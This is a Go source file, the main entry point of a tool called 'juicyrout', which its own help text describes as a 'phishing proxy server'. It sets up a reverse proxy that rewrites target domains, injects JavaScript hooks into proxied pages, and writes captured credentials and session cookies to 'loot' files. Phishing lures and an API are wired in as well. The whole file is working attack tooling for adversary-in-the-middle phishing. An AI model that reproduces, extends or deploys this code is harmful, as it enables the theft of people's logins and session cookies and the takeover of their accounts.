package main

import (
	_ "embed"
	"fmt"
	"io/fs"
	"net"
	"net/http"
	"os"
	"runtime/debug"
	"strings"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/compress"
	"github.com/gofiber/fiber/v2/middleware/limiter"
	"github.com/gofiber/fiber/v2/middleware/recover"
	"github.com/gofiber/fiber/v2/middleware/session"
	"github.com/gofiber/fiber/v2/utils"
	"github.com/gofiber/storage/memory"
	"github.com/rs/zerolog"
	"github.com/spf13/cobra"
)

//go:embed js/change-url.js
var changeURLScript string

//go:embed js/fetch-hook.js
var fetchHookScript string

func setupHTTPClient() *http.Client {
	// DefaultTransport without ForceAttemptHTTP2 (temporarily disable HTTP2)
	// TODO enable http2 as soon as the bug https://github.com/golang/go/issues/47882 is fixed
	return &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyFromEnvironment,
			DialContext: (&net.Dialer{
				Timeout:   30 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			MaxIdleConns:          100,
			IdleConnTimeout:       90 * time.Second,
			TLSHandshakeTimeout:   10 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		},
	}
}

func setupDomainConverter(conf *appConfig) DomainConverter {
	conv := NewDomainConverter(conf.DomainNameWithPort)
	conv.AddStaticMapping("www.w3.org", "www.w3.org")
	for _, pair := range conf.StaticDomainMappings {
		conv.AddStaticMapping(pair.Proxy, pair.Target)
	}
	return conv
}

func setupRequestProcessor(log *zerolog.Logger, conv DomainConverter, userAgentSaver UserAgentSaver) RequestProcessor {
	requestURLProc := newURLRegexProcessor(log, func(domain string) string {
		return conv.ToTargetDomain(domain)
	})
	return NewRequestProcessor(conv, requestURLProc, userAgentSaver)
}

func setupResponseProcessor(log *zerolog.Logger, conf *appConfig, conv DomainConverter,
	cookieSaver CookieSaver, authService AuthService, lureService LureService) ResponseProcessor {
	baseScript := fmt.Sprintf(`
	var baseDomain = "%s"
	var apiURL = "https://%s"`, conf.DomainNameWithPort, conf.APIHostname)
	scripts := []string{baseScript, changeURLScript, fetchHookScript}
	scripts = append(scripts, conf.Phishlet.JsFilesBody...)
	injectScript := strings.Join(scripts, "\n")
	htmlProc := newHTMLRegexProcessor(log, conv, injectScript)
	responseURLProc := newURLRegexProcessor(log, func(domain string) string {
		return conv.ToProxyDomain(domain)
	})
	return NewResponseProcessor(log, conv, responseURLProc, htmlProc, cookieSaver, authService, lureService)
}

func setupProxyHandler(log *zerolog.Logger, conf *appConfig, conv DomainConverter,
	cookieSaver CookieSaver, lootService *lootService, lureService LureService) fiber.Handler {
	client := setupHTTPClient()
	req := setupRequestProcessor(log, conv, lootService)
	resp := setupResponseProcessor(log, conf, conv, cookieSaver, lootService, lureService)
	return NewProxyHandler(log, client, req, resp)
}

func setupAuthHandler(log *zerolog.Logger, conf *appConfig,
	conv DomainConverter, lureService LureService, lootService *lootService) fiber.Handler {

	storage := NewSessionStorage(memory.New(), lootService)
	store := session.New(session.Config{
		Expiration:     conf.SessionExpiration,
		KeyLookup:      "cookie:" + conf.SessionCookieName,
		CookieDomain:   conf.DomainName,
		CookieSecure:   true,
		CookieHTTPOnly: true,
		Storage:        storage,
	})
	sm := NewSessionManager(log, store, conf.SessionCookieName)
	storage.AddSessionDeleter(sm)
	authConf := AuthConfig{
		SessionManager: sm,
		InvalidAuthURL: conf.Phishlet.InvalidAuthURL,
		LoginURL:       conv.ToProxyURL(conf.Phishlet.LoginURL),
		LureService:    lureService,
		AuthService:    lootService,
	}
	if conf.NoAuth {
		return NewNoAuthMiddleware(authConf)
	}
	return NewAuthMiddleware(log, authConf)
}

func setupApp(log *zerolog.Logger, limit, api, auth, proxy fiber.Handler) *appServer {
	app := fiber.New(fiber.Config{
		StreamRequestBody:     true,
		DisableStartupMessage: true,
		IdleTimeout:           10 * time.Second,
	})

	app.Use(recover.New(recover.Config{
		EnableStackTrace: true,
		StackTraceHandler: func(e interface{}) {
			log.Error().Any("recover", e).Str("stack", utils.UnsafeString(debug.Stack())).Msg("recover from panic")
		},
	}))
	app.Use(limit)
	app.Use(compress.New())

	// allowed HTTP methods with auth
	httpMethods := []string{
		fiber.MethodGet,
		fiber.MethodHead,
		fiber.MethodPost,
		fiber.MethodPut,
		fiber.MethodDelete,
		fiber.MethodPatch,
	}
	for _, method := range httpMethods {
		app.Add(method, "/*", api, auth, proxy)
	}
	// for CORS preflight requests
	app.Options("/*", api, proxy)
	return &appServer{log: log, app: app}
}

type hostFS struct{}

func (hostFS) Open(name string) (fs.File, error) {
	return os.Open(name)
}

var osFS hostFS

func main() {
	logger := zerolog.New(zerolog.ConsoleWriter{Out: os.Stderr, TimeFormat: time.RFC3339}).With().Timestamp().Logger()
	if err := newServerCmd(&logger).Execute(); err != nil {
		logger.Error().Err(err).Msg("failed to start server")
		os.Exit(1)
	}
}

func newServerCmd(log *zerolog.Logger) *serverCmd {
	c := &serverCmd{log: log}
	cmd := &cobra.Command{
		Use:           "juicyrout [flags]",
		Example:       "juicyrout -c config.yaml",
		Short:         "Start phishing proxy server",
		SilenceErrors: true,
		RunE: func(_ *cobra.Command, _ []string) (err error) {
			return c.run()
		},
	}
	c.opts.initCliFlags(cmd)
	c.cmd = cmd
	return c
}

func (c *serverCmd) Execute() error {
	return c.cmd.Execute()
}

type serverCmd struct {
	log  *zerolog.Logger
	cmd  *cobra.Command
	opts serverCmdOpts
}

type serverCmdOpts struct {
	configFile   string
	envFile      string
	verboseLevel int
}

func (o *serverCmdOpts) initCliFlags(cmd *cobra.Command) {
	cmd.Flags().StringVarP(&o.configFile, "config", "c", "", "yaml config file")
	cmd.Flags().StringVarP(&o.envFile, "env", "e", "", "dotenv config file")
	cmd.Flags().CountVarP(&o.verboseLevel, "verbose", "v", "log verbose level")
}

func (c *serverCmd) run() error {
	c.log = setLogLevel(c.log, c.opts.verboseLevel)
	if c.opts.envFile == "" {
		if _, err := os.Stat(".env"); err == nil {
			c.opts.envFile = ".env"
		}
	}

	conf, err := setupAppConfig(osFS, c.opts.configFile, c.opts.envFile)
	if err != nil {
		return err
	}

	credsFile, err := os.OpenFile(conf.CredsFile, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
	if err != nil {
		return err
	}
	defer credsFile.Close()
	lootRepo := NewFileLootRepository(c.log, credsFile)

	sessionsFile, err := os.OpenFile(conf.SessionsFile, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
	if err != nil {
		return err
	}
	defer sessionsFile.Close()
	sessionRepo := NewFileSessionRepository(sessionsFile)
	lootService := NewLootService(c.log, lootRepo, sessionRepo, conf.Phishlet.SessionCookies)
	cookieService := NewCookieService()
	cookieSaver := NewMultiCookieSaver(cookieService, lootService)

	conv := setupDomainConverter(conf)
	lureService, err := NewLureService(&FileByteSource{conf.LuresFile})
	if err != nil {
		return err
	}
	auth := setupAuthHandler(c.log, conf, conv, lureService, lootService)
	api := NewAPIMiddleware(c.log, APIConfig{
		APIHostname:     conf.APIHostname,
		APIToken:        conf.APIToken,
		DomainConverter: conv,
		AuthHandler:     auth,
		LootService:     lootService,
		LureService:     lureService,
		CookieSaver:     cookieSaver,
	})
	proxy := setupProxyHandler(c.log, conf, conv, cookieSaver, lootService, lureService)

	limit := limiter.New(limiter.Config{
		Max:        conf.LimitMax,
		Expiration: conf.LimitExpiration,
	})
	app := setupApp(c.log, limit, api, auth, proxy)
	return app.Listen(conf)
}

type appServer struct {
	log *zerolog.Logger
	app *fiber.App
}

func (s *appServer) Listen(conf *appConfig) error {
	s.log.Info().Msgf("listening on %s", conf.ListenAddr)
	if conf.TLSKey != "" {
		return s.app.ListenTLS(conf.ListenAddr, conf.TLSCert, conf.TLSKey)
	}
	return s.app.Listen(conf.ListenAddr)
}
